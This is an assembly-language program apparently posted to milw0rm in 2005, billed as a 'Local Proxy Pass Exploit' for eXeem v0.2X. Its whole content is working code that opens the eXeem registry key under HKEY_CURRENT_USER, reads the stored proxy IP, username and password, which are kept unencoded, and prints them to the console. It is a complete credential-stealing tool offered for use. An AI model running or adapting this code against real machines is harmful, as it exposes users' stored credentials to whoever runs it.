;Nothing Special other than the program doesnt encode the proxy info.

.386
.model flat, stdcall
option casemap :none
include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\shell32.inc
include \masm32\include\advapi32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\masm32.lib
     literal MACRO quoted_text:VARARG
       LOCAL local_text
       .data
         local_text db quoted_text,0
       .code
       EXITM <local_text>
     ENDM
     SADD MACRO quoted_text:VARARG
       EXITM <ADDR literal(quoted_text)>
     ENDM
.data
   SubKey            db "Software\\Exeem\",0
   szIP              db "proxy_ip",0
   szUser            db "proxy_username",0
   szPass            db "proxy_password",0
   noExeem           db "eXeem v0.2X is not installed on your pc!",0
   NotFound          db "Info NOT Stored.",0
   Theoutput  db   '_______________________________________________________________',13,10
              db   '*               Exeem v0.2X Local Proxy Pass Exploit          *',13,10
              db   '*                    Based On Kozans code in C                *',13,10
              db   '*                by illwill  - xillwillx@yahoo.com            *',13,10
              db   '*_____________________________________________________________*',13,10
              db   '                      Proxy IP: %s                             ',13,10
              db   '                      UserName: %s                             ',13,10
              db   '                      Password: %s                             ',13,10,0
   KeySize    DWORD 255
.data?
    TheIPData           db 64 dup (?)
    TheUSERData         db 64 dup (?)
    ThePASSData         db 64 dup (?)
    TheReturn           DWORD ?
    strbuf              db 258 dup (0) 
.code
start:
    invoke RegOpenKeyEx, HKEY_CURRENT_USER,addr SubKey,0,KEY_READ,addr TheReturn
     .IF eax==ERROR_SUCCESS
        invoke RegQueryValueEx,TheReturn,addr szIP,0,0,addr TheIPData, addr KeySize
                        .IF KeySize < 2
                             invoke lstrcpy,addr TheIPData,SADD("NOT FOUND")
                        .ENDIF
        invoke RegQueryValueEx,TheReturn,addr szUser,0,0,addr TheUSERData, addr KeySize
                        .IF KeySize < 2
                             invoke lstrcpy,addr TheUSERData,SADD("NOT FOUND")
                        .ENDIF
        invoke RegQueryValueEx,TheReturn,addr szPass,0,0,addr ThePASSData, addr KeySize
                         .IF KeySize < 2
                             invoke lstrcpy,addr ThePASSData,SADD("NOT FOUND")
                        .ENDIF
        invoke wsprintf, addr strbuf, addr Theoutput,addr TheIPData,addr TheUSERData,addr ThePASSData
        invoke StdOut, addr strbuf
     .ELSE  
        invoke StdOut, addr noExeem  
     .ENDIF
    invoke RegCloseKey , TheReturn
   Invoke ExitProcess,0
end start

; milw0rm.com [2005-02-26]
